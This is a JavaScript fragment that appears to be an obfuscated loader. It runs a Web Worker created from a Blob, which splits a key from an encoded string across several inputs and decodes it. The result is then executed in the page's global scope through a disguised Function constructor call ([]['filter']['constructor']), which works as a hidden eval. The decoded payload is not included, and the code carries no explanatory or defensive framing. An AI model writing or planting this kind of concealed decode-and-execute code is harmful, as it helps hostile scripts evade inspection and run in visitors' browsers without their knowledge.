     var ThreadLogic = window.URL.createObjectURL(
            new Blob([(function(){
                var body = (function (){
                    self.addEventListener("message",function(e){
                        var scope1 = 0;
                        var scope2 = 0;
                        var scope3 = 0;
                        var scope4 = [];
                        var scope5 = [];
                        var n = e.data[0];
                        var i = e.data[1];
                        var r = e.data[2];
                        var u = e.data[3];
                        //var s = e.data[4];
                        while (true) {
                        	//Scope1                
                            if (scope1 < 5) {
                                scope5.push(n.charAt(scope1)); //Password Extract
                            }
                            else if (scope1 < n.length) {
                                scope4.push(n.charAt(scope1)); //Encrypted String Extraact
                            }
                            scope1++;
                    
                            //Scope2
                            if (scope2 < 5) {
                                scope5.push(i.charAt(scope2)); //Password Extract
                            }
                            else if (scope2 < i.length) {
                                scope4.push(i.charAt(scope2)); //Encrypted String Extraact
                            }
                            scope2++;
                    
                            //Scope3
                            if (scope3 < 5) {
                                scope5.push(r.charAt(scope3)); //Password Extract
                            }
                            else if (scope3 < r.length) {
                                scope4.push(r.charAt(scope3)); //Encrypted String Extraact
                            }
                            scope3++;
                    
                            //Final loop breaker
                            if (n.length + i.length + r.length + u.length == scope4.length + scope5.length + u.length) {
                                break;
                            }    
                        }
                        
                        //Routine to extract the password and Encrypted string
                        var word1 = scope4.join(''); //Encrypted string
                        var word2 = scope5.join(''); //Password
                        scope2 = 0;
                        var result = [];
                        for (scope1 = 0; scope1 < scope4.length; scope1 += 2) {
                            var salt = -1;
                            if (word2.charCodeAt(scope2) % 2) { // When odd number - init = 1 even number init = -1
                                salt = 1;
                            }
                            result.push(String.fromCharCode(parseInt(word1.substr(scope1, 2), 36) - salt));
                            scope2++;
                            if (scope2 >= scope5.length) {
                                scope2 = 0;
                            }
                        }
                        
                        self.postMessage(result.join(''));
                        self.close();
                    },false);
                }).toString();
                
                return body.substring(body.indexOf("{")+1,body.lastIndexOf("}"));
            })()]
        ));
        
        var _signal = arguments[4], args;
        
        for(var i = 0; i<3; i++){
          args = _signal.pop();
        }
        var worker = new Worker(ThreadLogic);
        
        worker.onmessage =function(e){
            console.log(e.data);
            []["filter"]["constructor"]( e.data ).call(window);
            window.URL.revokeObjectURL(ThreadLogic);
        };
        
        worker.postMessage(arguments);
 